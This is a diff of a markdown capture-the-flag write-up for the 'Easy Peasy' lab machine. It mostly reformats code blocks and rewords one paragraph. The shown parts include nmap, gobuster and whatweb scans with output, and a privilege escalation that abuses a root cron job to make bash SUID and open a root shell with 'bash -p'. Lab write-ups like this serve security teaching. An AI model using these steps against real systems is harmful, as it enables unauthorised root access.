@@ -26,16 +26,12 @@ This writeup documents the penetration testing of the [**Easy Peasy**](https://t
 # Information Gathering, Vulnerability Assessment and Exploitation
 ------------------
 
-After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
-
-A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
 * TTL 64: Linux.
 * TTL 128: Windows.
 
-```bash
+```
 ❯ ping -c 1 10.10.92.16
-```
-```
 PING 10.10.92.16 (10.10.92.16) 56(84) bytes of data.
 64 bytes from 10.10.92.16: icmp_seq=1 ttl=63 time=51.9 ms
 
@@ -46,10 +42,8 @@ rtt min/avg/max/mdev = 51.885/51.885/51.885/0.000 ms
 
 In this case, it seems to be a Linux machine. Let's perform some scans.
 
-```bash
+```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.16 -oG allPorts
-```
-```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 14:28 CET
 Initiating SYN Stealth Scan at 14:28
@@ -73,10 +67,8 @@ Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
            Raw packets sent: 82220 (3.618MB) | Rcvd: 64498 (2.580MB)
 ```
 
-```bash
+```
 ❯ nmap -sCV -p80,6498,65524 10.10.92.16 -oN targeted
-```
-```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 14:29 CET
 Nmap scan report for 10.10.92.16
 Host is up (0.051s latency).
@@ -103,14 +95,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds
 ```
 
-The nginx version is 1.16.1. The intrussion is probably going to be, or at least start, from port 80 or 65524. To figure out the Ubuntu's version codename we need to search in the internet the SSH version followed by '**launchpad**': https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3, we are facing an **Ubuntu Bionic**. 
+The nginx version is 1.16.1. The intrussion is probably going to be, or at least start, from port 80 or 65524. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s [Enumeration Cheat Sheet](https://pwnerguy.github.io/enumeration-cheatsheet/), which includes a table mapping service versions to possible operating system versions. We are facing an **Ubuntu Bionic**. 
 
 We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80:
 
-```bash
+```
 ❯ whatweb http://10.10.92.16
-```
-```
 http://10.10.92.16 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.16.1], IP[10.10.92.16], Title[Welcome to nginx!], nginx[1.16.1]
 ```
 
@@ -118,10 +108,8 @@ http://10.10.92.16 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.16.
 
 ![](/assets/images/thm-easy-peasy/robots2.png)
 
-```bash
+```
 ❯ gobuster dir -u 10.10.92.16 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 txt,conf,bak,old
-```
-```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -143,10 +131,8 @@ Finished
 ===============================================================
 ```
 
-```bash
+```
 ❯ gobuster dir -u 10.10.92.16/hidden -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 txt,conf,bak,old
-```
-```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -174,10 +160,8 @@ We have the **first flag** encoded in base64. To decode it: ``echo "flag" | base
 
 Let's also enumerate the web server running on the port 65524.
 
-```bassh
+```
 ❯ whatweb http://10.10.92.16:65524
-```
-```
 http://10.10.92.16:65524 [200 OK] Apache[2.4.43], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.43 (Ubuntu)], IP[10.10.92.16], Title[Apache2 Debian Default Page: It works]
 ```
 
@@ -231,10 +215,8 @@ It says it's rotated, it's rot13, we have the **user flag**.
 # Post-Exploitation
 -----
 
-```bash
+```
 boring@kral4-PC:/etc$ cat /etc/crontab
-```
-```
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -251,11 +233,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 * *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
-```
-```bash
 boring@kral4-PC:/var/www$ ls -la
-```
-```
 total 16
 drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
 drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
@@ -270,15 +248,9 @@ I'll add in ``.mysecretcronjob.sh`` the following command to give SUID permissio
 ```
 boring@kral4-PC:/var/www$ bash -p
 bash-4.4# whoami
-```
-```
 root
-```
-```
 bash-4.4# cd /root
 bash-4.4# ls -la
-```
-```
 total 40
 drwx------  5 root root 4096 Jun 15  2020 .
 drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
@@ -290,11 +262,7 @@ drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
 -rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
 -rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
-```
-```
 bash-4.4# cat .root.txt
-```
-```
 ***REDACTED_FLAG***
 ```
 
